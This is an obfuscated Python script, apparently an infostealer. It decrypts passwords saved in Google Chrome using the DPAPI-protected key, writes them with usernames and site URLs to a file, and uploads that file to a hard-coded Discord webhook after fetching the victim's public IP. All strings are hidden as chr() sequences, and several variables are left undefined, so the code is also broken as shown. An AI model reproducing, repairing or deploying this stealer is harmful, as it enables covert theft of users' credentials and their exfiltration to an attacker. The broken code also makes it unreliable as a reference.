import os
So=open
SR=None
SF=str
St=file
Sm=Exception
SC=os.remove
Sp=os.environ
Ss=os.path
import json
Sh=json.loads
import base64
Se=base64.b64decode
import sqlite3
Sk=sqlite3.connect
import win32crypt
SN=win32crypt.CryptUnprotectData
from Crypto.Cipher import AES
import shutil
Sd=shutil.copyfile
from datetime import timezone,datetime,timedelta
import socket
SI=socket.gethostname
import requests
SH=requests.get
Sj=requests.post
jl=SI()
def jW(chromedate):
  return datetime(int("".join([chr(49),chr(54),chr(48),chr(49)]))                      ,int("".join([chr(49)]))                        ,int("".join([chr(49)]))                          )+timedelta(microseconds=chromedate)
def jg():
  jr=Ss.join(Sp[("".join([chr(85),chr(83),chr(69),chr(82),chr(80),chr(82),chr(79),chr(70),chr(73),chr(76),chr(69)]))                             ],("".join([chr(65),chr(112),chr(112),chr(68),chr(97),chr(116),chr(97)]))                                                          ,("".join([chr(76),chr(111),chr(99),chr(97),chr(108)]))                                                                  ,("".join([chr(71),chr(111),chr(111),chr(103),chr(108),chr(101)]))                                                                           ,("".join([chr(67),chr(104),chr(114),chr(111),chr(109),chr(101)]))                                                                                    ,("".join([chr(85),chr(115),chr(101),chr(114),chr(32),chr(68),chr(97),chr(116),chr(97)]))                                                                                                                  ,("".join([chr(76),chr(111),chr(99),chr(97),chr(108),chr(32),chr(83),chr(116),chr(97),chr(116),chr(101)]))                                                                                                                                )
  with So(jr,("".join([chr(114)]))                ,encoding=("".join([chr(117),chr(116),chr(102),chr(45),chr(56)]))                                 )as f:
    jV=f.read()
    jV=Sh(jV)
  jD=Se(jV[("".join([chr(111),chr(115),chr(95),chr(99),chr(114),chr(121),chr(112),chr(116)]))                     ][("".join([chr(101),chr(110),chr(99),chr(114),chr(121),chr(112),chr(116),chr(101),chr(100),chr(95),chr(107),chr(101),chr(121)]))                                      ])
  jD=jD[int("".join([chr(53)]))         :]
  return SN(jD,SR,SR,SR,int("".join([chr(48)]))                         )[int("".join([chr(49)]))                            ]
def Sf(ju,jD):
  try:
    iv=ju[int("".join([chr(51)]))           :int("".join([chr(49),chr(53)]))              ]
    ju=ju[int("".join([chr(49),chr(53)]))            :]
    jb=AES.new(jD,AES.MODE_GCM,iv)
    return jb.decrypt(ju)[:-int("".join([chr(49),chr(54)]))                              ].decode()
  except:
    try:
      return SF(SN(ju,SR,SR,SR,int("".join([chr(48)]))                                )[int("".join([chr(49)]))                                   ])
    except:
      return''
def Sa():
  jD=jg()
  ji=Ss.join(Sp[("".join([chr(85),chr(83),chr(69),chr(82),chr(80),chr(82),chr(79),chr(70),chr(73),chr(76),chr(69)]))                             ],("".join([chr(65),chr(112),chr(112),chr(68),chr(97),chr(116),chr(97)]))                                        ,("".join([chr(76),chr(111),chr(99),chr(97),chr(108)]))                                                ,("".join([chr(71),chr(111),chr(111),chr(103),chr(108),chr(101)]))                                                                       ,("".join([chr(67),chr(104),chr(114),chr(111),chr(109),chr(101)]))                                                                                ,("".join([chr(85),chr(115),chr(101),chr(114),chr(32),chr(68),chr(97),chr(116),chr(97)]))                                                                                            ,("".join([chr(100),chr(101),chr(102),chr(97),chr(117),chr(108),chr(116)]))                                                                                                      ,("".join([chr(76),chr(111),chr(103),chr(105),chr(110),chr(32),chr(68),chr(97),chr(116),chr(97)]))                                                                                                                   )
  jq=("".join([chr(67),chr(104),chr(114),chr(111),chr(109),chr(101),chr(68),chr(97),chr(116),chr(97),chr(46),chr(100),chr(98)]))
  Sd(ji,jq)
  db=Sk(jq)
  jE=db.cursor()
  jE.execute(("".join([chr(115),chr(101),chr(108),chr(101),chr(99),chr(116),chr(32),chr(111),chr(114),chr(105),chr(103),chr(105),chr(110),chr(95),chr(117),chr(114),chr(108),chr(44),chr(32),chr(97),chr(99),chr(116),chr(105),chr(111),chr(110),chr(95),chr(117),chr(114),chr(108),chr(44),chr(32),chr(117),chr(115),chr(101),chr(114),chr(110),chr(97),chr(109),chr(101),chr(95),chr(118),chr(97),chr(108),chr(117),chr(101),chr(44),chr(32),chr(112),chr(97),chr(115),chr(115),chr(119),chr(111),chr(114),chr(100),chr(95),chr(118),chr(97),chr(108),chr(117),chr(101),chr(44),chr(32),chr(100),chr(97),chr(116),chr(101),chr(95),chr(99),chr(114),chr(101),chr(97),chr(116),chr(101),chr(100),chr(44),chr(32),chr(100),chr(97),chr(116),chr(101),chr(95),chr(108),chr(97),chr(115),chr(116),chr(95),chr(117),chr(115),chr(101),chr(100),chr(32),chr(102),chr(114),chr(111),chr(109),chr(32),chr(108),chr(111),chr(103),chr(105),chr(110),chr(115),chr(32),chr(111),chr(114),chr(100),chr(101),chr(114),chr(32),chr(98),chr(121),chr(32),chr(100),chr(97),chr(116),chr(101),chr(95),chr(99),chr(114),chr(101),chr(97),chr(116),chr(101),chr(100)]))                                                                                                                                            )
  for jP in jE.fetchall():
    jU=jP[int("".join([chr(48)]))           ]
    jJ=jP[int("".join([chr(49)]))           ]
    jA=jP[int("".join([chr(50)]))           ]
    ju=Sf(jP[int("".join([chr(51)]))              ],jD)
    jc=jP[int("".join([chr(52)]))           ]
    jL=jP[int("".join([chr(53)]))           ]
    if jA or ju:
      with So(f"{nom_ordi}.txt",("".join([chr(97)]))                                   )as St:
        St.write(f"Origin URL: {origin_url}\nAction URL: {action_url}\nUsername: {username}\nPassword: {password}\n")
    else:
      continue
    if jc!=int("".join([chr(56),chr(54),chr(52),chr(48),chr(48),chr(48),chr(48),chr(48),chr(48),chr(48),chr(48)]))                       and jc:
      with So(f"{nom_ordi}.txt",("".join([chr(97)]))                                   )as St:
        St.write(f"Creation date: {str(get_chrome_datetime(date_created))}\n")
    if jL!=int("".join([chr(56),chr(54),chr(52),chr(48),chr(48),chr(48),chr(48),chr(48),chr(48),chr(48),chr(48)]))                       and jL:
      with So(f"{nom_ordi}.txt",("".join([chr(97)]))                                   )as St:
        St.write(f"Last Used: {str(get_chrome_datetime(date_last_used))}\n")
    with So(f"{nom_ordi}.txt",("".join([chr(97)]))                                 )as St:
      St.write(("".join([chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(61),chr(10)]))                                                                                                )
  jE.close()
  db.close()
  try:
    SC(jq)
  except:
    pass
  try:
    jT=f"{nom_ordi}.txt"
    if Ss.exists(jT):
      Sj(("".join([chr(104),chr(116),chr(116),chr(112),chr(115),chr(58),chr(47),chr(47),chr(100),chr(105),chr(115),chr(99),chr(111),chr(114),chr(100),chr(46),chr(99),chr(111),chr(109),chr(47),chr(97),chr(112),chr(105),chr(47),chr(119),chr(101),chr(98),chr(104),chr(111),chr(111),chr(107),chr(115),chr(47),chr(49),chr(50),chr(49),chr(51),chr(57),chr(48),chr(56),chr(51),chr(49),chr(53),chr(57),chr(51),chr(49),chr(54),chr(55),chr(50),chr(54),chr(49),chr(54),chr(47),chr(65),chr(120),chr(84),chr(100),chr(90),chr(89),chr(117),chr(77),chr(89),chr(82),chr(45),chr(75),chr(121),chr(84),chr(107),chr(114),chr(108),chr(88),chr(75),chr(115),chr(107),chr(53),chr(83),chr(79),chr(45),chr(97),chr(106),chr(65),chr(79),chr(118),chr(89),chr(79),chr(120),chr(87),chr(104),chr(69),chr(82),chr(109),chr(81),chr(109),chr(45),chr(89),chr(65),chr(100),chr(87),chr(56),chr(55),chr(72),chr(98),chr(78),chr(66),chr(85),chr(86),chr(85),chr(55),chr(67),chr(66),chr(83),chr(75),chr(72),chr(108),chr(105),chr(78),chr(116),chr(67),chr(113),chr(74),chr(119)]))                                                                                                                                    ,files={("".join([chr(102),chr(105),chr(108),chr(101)]))                                                                                                                                                  :So(f"{nom_fichier}")})
      SC(jT)
      pass
    else:
      pass
  except Sm as e:
    pass
def SB():
  try:
    jO=SH(("".join([chr(104),chr(116),chr(116),chr(112),chr(115),chr(58),chr(47),chr(47),chr(104),chr(116),chr(116),chr(112),chr(98),chr(105),chr(110),chr(46),chr(111),chr(114),chr(103),chr(47),chr(105),chr(112)]))                                  )
    jQ=jO.json().get(("".join([chr(111),chr(114),chr(105),chr(103),chr(105),chr(110)]))                             )
    return jQ
  except Sm as e:
    pass
    return SR
with So(f"{nom_ordi}.txt",("".join([chr(119)]))                             )as St:
  St.close()
jQ=SB()
with So(f"{nom_ordi}.txt",("".join([chr(97)]))                             )as St:
  St.write(f"{nom_ordi}\n{ip_publique}\n\n\n")
